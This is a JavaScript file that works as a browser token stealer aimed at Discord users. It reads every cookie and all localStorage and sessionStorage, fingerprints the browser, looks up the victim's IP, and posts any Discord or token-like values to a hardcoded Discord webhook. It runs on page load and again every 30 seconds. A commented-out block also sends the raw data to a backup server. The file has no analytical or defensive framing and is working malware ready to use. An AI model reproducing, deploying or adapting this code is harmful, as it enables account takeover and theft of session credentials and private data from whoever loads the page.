// Function to get all cookies as object
function getAllCookies() {
    let cookies = {};
    document.cookie.split(';').forEach(cookie => {
        let [name, value] = cookie.trim().split('=');
        cookies[name] = decodeURIComponent(value);
    });
    return cookies;
}

// Function to get browser fingerprint
function getFingerprint() {
    let fingerprint = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenRes: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        doNotTrack: navigator.doNotTrack,
        plugins: Array.from(navigator.plugins).map(p => p.name),
        webglVendor: null,
        canvasFingerprint: null
    };
    
    // WebGL fingerprinting
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl');
    if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            fingerprint.webglVendor = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
    }
    
    // Canvas fingerprint
    const ctx = document.createElement('canvas').getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 100, 50);
    ctx.fillStyle = '#069';
    ctx.fillText('fingerprint', 10, 20);
    fingerprint.canvasFingerprint = ctx.canvas.toDataURL();
    
    return fingerprint;
}

// Function to get all localStorage and sessionStorage
function getAllStorage() {
    let storage = {
        localStorage: {},
        sessionStorage: {}
    };
    
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        storage.localStorage[key] = localStorage.getItem(key);
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        let key = sessionStorage.key(i);
        storage.sessionStorage[key] = sessionStorage.getItem(key);
    }
    
    return storage;
}

// Function to extract Discord token specifically
function getDiscordToken() {
    let token = null;
    // Check localStorage for Discord tokens
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        if (key && (key.includes('token') || key === 'token')) {
            token = localStorage.getItem(key);
        }
    }
    // Check cookies for Discord tokens
    let cookies = getAllCookies();
    for (let [key, value] of Object.entries(cookies)) {
        if (key.toLowerCase().includes('token') || key === 'authorization') {
            token = value;
        }
    }
    return token;
}

// Main grab function
async function grabAndSend() {
    const discordToken = getDiscordToken();
    const allCookies = getAllCookies();
    const storage = getAllStorage();
    const fingerprint = getFingerprint();
    
    // Prepare payload
    const payload = {
        timestamp: new Date().toISOString(),
        victimIP: await getIP(), // custom function below
        pageURL: window.location.href,
        referrer: document.referrer,
        discord_token: discordToken,
        all_tokens_found: [],
        cookies: allCookies,
        localStorage: storage.localStorage,
        sessionStorage: storage.sessionStorage,
        fingerprint: fingerprint,
        system_info: {
            os: navigator.platform,
            browser: navigator.userAgent,
            language: navigator.language,
            online_status: navigator.onLine
        }
    };
    
    // Search for any token-like strings
    for (let [key, value] of Object.entries(allCookies)) {
        if (value && (value.length > 20 && value.match(/^[a-zA-Z0-9_-]{20,}$/))) {
            payload.all_tokens_found.push({ source: 'cookie', key: key, value: value });
        }
    }
    for (let [key, value] of Object.entries(storage.localStorage)) {
        if (value && typeof value === 'string' && value.length > 20 && value.match(/^[a-zA-Z0-9_-]{20,}$/)) {
            payload.all_tokens_found.push({ source: 'localStorage', key: key, value: value });
        }
    }
    
    // Send to webhook
    const webhookURL = "https://discord.com/api/webhooks/1510259871327588564/yJxLvuCDplRPPWBSzwE53rsrwfH7xNPMnssWbAYahvCSwRWaLZNaDIIJiYHrNllDH7Cj";
    
    // Format for Discord embed
    const embed = {
        title: "🎯 Token Grabbed",
        color: 0xff0000,
        fields: [
            {
                name: "Discord Token",
                value: discordToken ? `\`${discordToken}\`` : "Not found",
                inline: false
            },
            {
                name: "All Found Tokens",
                value: payload.all_tokens_found.length > 0 ? 
                    payload.all_tokens_found.map(t => `\`${t.key}: ${t.value.substring(0, 30)}...\``).join('\n') : 
                    "None",
                inline: false
            },
            {
                name: "Victim Info",
                value: `IP: ${payload.victimIP}\nBrowser: ${navigator.userAgent.split(' ')[0]}\nOS: ${navigator.platform}`,
                inline: true
            },
            {
                name: "Page URL",
                value: payload.pageURL,
                inline: false
            }
        ],
        footer: { text: `Timestamp: ${payload.timestamp}` },
        timestamp: payload.timestamp
    };
    
    fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed], content: "@everyone" })
    }).catch(e => console.log(e));
    
        // // Also send raw JSON to a secondary endpoint
    // fetch('https://your-backup-server.com/log', {
    //     method: 'POST',
    //     body: JSON.stringify(payload),
    //     headers: { 'Content-Type': 'application/json' }
    // }).catch(e => console.log(e));
}

// Helper to get victim IP (using external service)
async function getIP() {
    try {
        let response = await fetch('https://api.ipify.org?format=json');
        let data = await response.json();
        return data.ip;
    } catch(e) {
        return 'Unable to fetch';
    }
}

// Execute
grabAndSend();

// Optional: re-run every 30 seconds to catch new tokens
setInterval(grabAndSend, 30000);
